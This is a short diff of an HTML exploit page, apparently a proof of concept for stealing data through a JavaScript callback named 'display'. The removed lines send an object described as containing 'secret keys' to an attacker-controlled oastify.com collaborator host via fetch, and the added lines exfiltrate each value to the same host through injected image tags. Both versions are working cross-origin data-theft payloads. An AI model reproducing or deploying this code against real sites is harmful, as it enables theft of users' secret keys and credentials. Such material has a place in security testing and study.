@@ -8,9 +8,9 @@
     -->
     <script>
         function display(data) {
-            // 2. SEND THE DATA TO THE REMOTE ATTACKER SERVER
-            // 'data' is the object containing the secret keys.
-            fetch('https://dj0kl23k4gnvncg8gy82cxeoxf36r1fq.oastify.com/exploit?secret=' + encodeURIComponent(JSON.stringify(data)));
+            for (var key in data){
+                document.write("<img src='https://dj0kl23k4gnvncg8gy82cxeoxf36r1fq.oastify.com/?s="+data[key]+"'/>");
+            }
         }
     </script>
 
